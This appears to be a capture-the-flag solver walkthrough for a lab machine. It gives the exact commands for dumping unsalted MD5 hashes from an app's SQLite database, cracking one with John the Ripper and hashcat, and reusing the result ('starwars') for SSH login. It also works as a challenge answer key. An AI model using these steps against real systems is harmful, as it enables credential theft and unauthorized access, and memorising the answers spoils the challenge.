# Solver Notes & Walkthrough

This document contains solver walkthrough details, credential analysis, and exploit steps.

## Step 2: Credential Looting & Password Cracking (Issues #10, #14)

After achieving the web foothold via sandbox escape (Issue #5 / #6), the SQLite database is located at:
```bash
/opt/app/instance/database.db
# or /opt/app/database.db
```

### 1. Extracting Credential Hashes
Querying the `users` table reveals:

| username | password_hash | notes |
| --- | --- | --- |
| `admin` | `b81c35e0cb8bdf19c669e5ecc2adbbe7` | High-entropy noise |
| `martin` | `5badcaf789d3d1d09794d8f021f40f0e` | Target user for lateral movement |
| `clara` | `f96d2ec4a85175c0bec2afbf4dd00f52` | Noise |

The hashes are unsalted **MD5** (32 hex characters).

### 2. Wordlist
The target hash is present in standard dictionary wordlists:
- **Recommended wordlist**: `rockyou.txt` (or any top 1000 common passwords list)
- Word rank: Top 100 in `rockyou.txt`

### 3. Cracking with John the Ripper

Save the hash to `hash.txt`:
```bash
echo "5badcaf789d3d1d09794d8f021f40f0e" > hash.txt
```

Run John:
```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

View the cracked result:
```bash
john --format=raw-md5 --show hash.txt
# Output: ?:starwars
```

### 4. Cracking with Hashcat

Using hashcat (hash mode `0` for MD5):
```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Output:
```
5badcaf789d3d1d09794d8f021f40f0e:starwars
```

### 5. Next Step: SSH Login (Issue #12)
Password reuse allows SSH login as system user `martin`:
```bash
ssh martin@<target-ip> -p 2222
# Password: starwars
```
